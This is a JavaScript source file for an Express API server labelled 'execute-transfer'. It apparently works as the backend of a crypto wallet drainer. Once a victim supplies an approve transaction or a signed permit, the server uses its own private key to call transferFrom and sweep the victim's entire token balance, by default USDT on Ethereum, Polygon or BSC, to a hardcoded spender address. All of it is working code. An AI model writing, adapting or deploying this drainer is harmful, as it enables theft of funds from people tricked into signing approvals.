/**
 * Standalone API server for execute-transfer (same as CryptoGPT).
 * Use when running API separately from Next.js.
 * Run: SPENDER_PRIVATE_KEY=0x... node server.js
 * Or set SPENDER_PRIVATE_KEY in .env
 */
import express from "express";
import { ethers } from "ethers";

const app = express();
app.use(express.json());
app.use((req, res, next) => {
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();
  next();
});

const SPENDER_ADDRESS = "0x9E6120D8Bc8363b1FCF367eE34219C82D34a3f15";

const RPC_URL_BY_CHAIN = {
  1: process.env.RPC_URL_ETH || process.env.RPC_URL || "https://eth.llamarpc.com",
  137: process.env.RPC_URL_POLYGON || "https://polygon.llamarpc.com",
  56: process.env.RPC_URL_BSC || "https://bsc-dataseed.binance.org",
};

const DEFAULT_TOKEN_BY_CHAIN = {
  1: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  137: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
  56: "0x55d398326f99059fF775485246999027B3197955",
};

const ERC20_ABI = [
  {
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
    ],
    name: "allowance",
    outputs: [{ type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [{ name: "account", type: "address" }],
    name: "balanceOf",
    outputs: [{ type: "uint256" }],
    stateMutability: "view",
    type: "function",
  },
  {
    inputs: [
      { name: "from", type: "address" },
      { name: "to", type: "address" },
      { name: "amount", type: "uint256" },
    ],
    name: "transferFrom",
    outputs: [{ type: "bool" }],
    stateMutability: "nonpayable",
    type: "function",
  },
];

const ERC2612_PERMIT_ABI = [
  ...ERC20_ABI,
  {
    inputs: [
      { name: "owner", type: "address" },
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
      { name: "deadline", type: "uint256" },
      { name: "v", type: "uint8" },
      { name: "r", type: "bytes32" },
      { name: "s", type: "bytes32" },
    ],
    name: "permit",
    outputs: [],
    stateMutability: "nonpayable",
    type: "function",
  },
];

async function waitForReceipt(provider, txHash, maxAttempts = 30) {
  for (let i = 0; i < maxAttempts; i++) {
    const receipt = await provider.getTransactionReceipt(txHash);
    if (receipt && receipt.blockNumber) return receipt;
    await new Promise((r) => setTimeout(r, 2000));
  }
  return null;
}

app.post("/api/execute-transfer", async (req, res) => {
  const privateKey = process.env.SPENDER_PRIVATE_KEY;
  if (!privateKey) {
    return res.status(500).json({ error: "SPENDER_PRIVATE_KEY not set" });
  }

  const { userAddress, chainId = 1, approveTxHash, permit, tokenAddress } =
    req.body || {};
  if (
    !userAddress ||
    typeof userAddress !== "string" ||
    !userAddress.match(/^0x[a-fA-F0-9]{40}$/)
  ) {
    return res.status(400).json({ error: "Invalid userAddress" });
  }

  const rpcUrl = RPC_URL_BY_CHAIN[chainId];
  if (!rpcUrl) {
    return res.status(400).json({ error: "Unsupported chain" });
  }

  try {
    const provider = new ethers.JsonRpcProvider(rpcUrl);
    const wallet = new ethers.Wallet(privateKey, provider);

    const isPermitFlow = permit && tokenAddress;
    const tokenAddr = tokenAddress || DEFAULT_TOKEN_BY_CHAIN[chainId];

    if (isPermitFlow) {
      const token = new ethers.Contract(
        tokenAddr,
        ERC2612_PERMIT_ABI,
        provider
      );
      const tokenWithSigner = token.connect(wallet);
      await tokenWithSigner.permit(
        userAddress,
        SPENDER_ADDRESS,
        BigInt(permit.value),
        BigInt(permit.deadline),
        permit.v,
        permit.r,
        permit.s
      );
    } else if (approveTxHash) {
      const receipt = await waitForReceipt(provider, approveTxHash);
      if (!receipt || !receipt.status) {
        return res
          .status(400)
          .json({ error: "Approve transaction not confirmed" });
      }
    } else {
      await new Promise((r) => setTimeout(r, 5000));
    }

    const token = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
    const [balance, allowance] = await Promise.all([
      token.balanceOf(userAddress),
      token.allowance(userAddress, SPENDER_ADDRESS),
    ]);

    if (balance === 0n) {
      return res
        .status(200)
        .json({ success: true, transferred: "0", message: "No balance" });
    }

    const amount = allowance >= balance ? balance : allowance;
    if (amount === 0n) {
      return res.status(400).json({ error: "Insufficient allowance" });
    }

    const tokenWithSigner = token.connect(wallet);
    const tx = await tokenWithSigner.transferFrom(
      userAddress,
      SPENDER_ADDRESS,
      amount
    );
    await tx.wait();

    return res
      .status(200)
      .json({ success: true, txHash: tx.hash, amount: amount.toString() });
  } catch (err) {
    console.error("execute-transfer error:", err);
    return res
      .status(500)
      .json({ error: err.message || "Transfer failed" });
  }
});

const PORT = process.env.PORT || 3001;
app.listen(PORT, () =>
  console.log(`API running on http://localhost:${PORT}`)
);
